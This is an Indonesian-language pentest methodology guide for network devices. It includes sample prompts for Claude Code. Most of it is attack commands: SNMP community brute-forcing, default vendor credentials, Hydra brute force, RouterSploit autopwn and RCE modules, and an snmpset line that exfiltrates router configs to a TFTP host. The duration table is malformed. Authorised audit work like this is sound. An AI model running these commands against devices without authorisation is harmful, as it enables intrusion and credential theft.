# Hardware Pentest: Network Devices (Router/Switch/Firewall)

**Target:** Router, switch, firewall — perangkat jaringan aktif  
**Durasi:** 2–4 hari  
**Akses:** Akses jaringan + kadang akses fisik ke device

---

## Phase 1: Device Fingerprinting

```bash
# Identifikasi vendor dan model dari banner/SNMP
nmap -sV -p 22,23,80,161,443 192.168.1.1
nmap --script banner -p 23 192.168.1.1    # Telnet banner
nmap --script snmp-info -p 161 192.168.1.1 # SNMP info

# SNMP community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
  192.168.1.1

# Jika "public" community diterima — bisa dump konfigurasi!
snmpwalk -v2c -c public 192.168.1.1
snmpget -v2c -c public 192.168.1.1 sysDescr.0  # versi firmware
```

**Prompt Claude Code:**
```
SNMP walk berhasil dengan community string "public" pada Cisco router 192.168.1.1.

snmpwalk output (sebagian):
iso.3.6.1.2.1.1.1.0 = "Cisco IOS Software, Version 12.4(24)T4"
iso.3.6.1.2.1.1.5.0 = "CORP-ROUTER-01"
iso.3.6.1.2.1.4.20.1 = routing table (10 entry)
iso.3.6.1.2.1.4.21.1 = interface table (5 interface)

Identifikasi:
1. Cisco IOS 12.4(24)T4 — CVE apa yang relevan?
2. SNMP public community — apa yang bisa dilakukan penyerang?
3. Apakah bisa extract konfigurasi lengkap via SNMP?
4. Routing table — informasi apa yang bocor tentang topologi?
```

---

## Phase 2: Default Credential Testing

```bash
# Router default credentials yang paling umum
# Cisco: admin/cisco, admin/(blank), cisco/cisco
# MikroTik: admin/(blank)
# Juniper: root/(blank)
# Huawei: admin/Admin@huawei
# TP-Link: admin/admin
# D-Link: admin/(blank)

# Test SSH
ssh admin@192.168.1.1
ssh cisco@192.168.1.1

# Test Telnet (jika masih aktif — sangat insecure)
telnet 192.168.1.1

# Test web interface
curl -u admin:admin http://192.168.1.1/
curl -u admin:cisco http://192.168.1.1/

# Brute force dengan Hydra
hydra -l admin -P passwords.txt 192.168.1.1 ssh -t 3 -w 5
hydra -l admin -P passwords.txt 192.168.1.1 telnet
```

---

## Phase 3: RouterSploit

```bash
# RouterSploit — exploitation framework khusus router
pip install routersploit

rsf
rsf > use scanners/autopwn
rsf (AutoPwn) > set target 192.168.1.1
rsf (AutoPwn) > run

# Module spesifik per vendor
rsf > use exploits/routers/cisco/cisco_ios_http_unauthorized_access
rsf > use exploits/routers/tp_link/tplink_sr20_remote_code_execution
rsf > use exploits/routers/dlink/dlink_dir_300_600_rce
```

---

## Phase 4: Configuration Extraction & Analysis

```bash
# Jika berhasil login ke Cisco IOS
show running-config
show version
show ip route
show arp
show cdp neighbors  # topology discovery

# Extract konfigurasi via TFTP (jika SNMP write enabled)
snmpset -v2c -c private 192.168.1.1 \
  1.3.6.1.4.1.9.2.1.55.192.168.1.105 s /tmp/router_config.txt

# Analisis konfigurasi
grep -i "password\|secret\|enable\|username" running-config
grep -i "snmp-server community" running-config
grep -i "access-list" running-config
```

**Prompt Claude Code:**
```
Berhasil login ke Cisco router dengan default credential.
running-config (sebagian):

enable secret 5 $1$abc$HASHEDPASSWORD
username admin privilege 15 password 0 cisco123   ← plain text!
snmp-server community public RO
snmp-server community private RW   ← SNMP write community!
no service password-encryption       ← password tidak dienkripsi!
no ip ssh version 2                  ← SSH v1!
line vty 0 4
 transport input telnet               ← Telnet diaktifkan!

Analisis semua security issue yang ada dan tulis rekomendasi hardening
yang spesifik untuk Cisco IOS.
```

---

## Phase 5: Firmware Vulnerability

```bash
# Download firmware dari vendor
# Cari di vendor website, gunakan nomor model dari fingerprinting

# Analisis firmware router
binwalk -e firmware_tplink.bin
find _firmware/ -name "*.cgi" -o -name "*.sh"  # cari script web
strings _firmware/usr/sbin/httpd | grep "pass\|admin\|secret"

# RouterSploit firmware analyzer
rsf > use auxiliary/analyze/report
rsf > set firmware /path/to/firmware.bin
rsf > run
```

---

## Checklist Network Device Pentest

```
[ ] Fingerprint: vendor, model, firmware version
[ ] SNMP community string discovery
[ ] Default credential testing (SSH, Telnet, HTTP, HTTPS)
[ ] RouterSploit autopwn
[ ] Konfigurasi extraction dan review
[ ] Cek: Telnet aktif? SNMPv1/v2 dengan default community?
[ ] Cek: password tidak terenkripsi?
[ ] Firmware download dan binwalk analysis
[ ] Laporan: Cisco hardening guide / CIS Benchmark per vendor
```

---

## Durasi Estimasi

| Sub-skenario | Durasi |
|-------------|-----------|----------|
| Per device (basic) | 0.5–1 hari | 1–2 hari |
| Full network device audit (10+ device) | 3–5 hari | 7–12 hari |
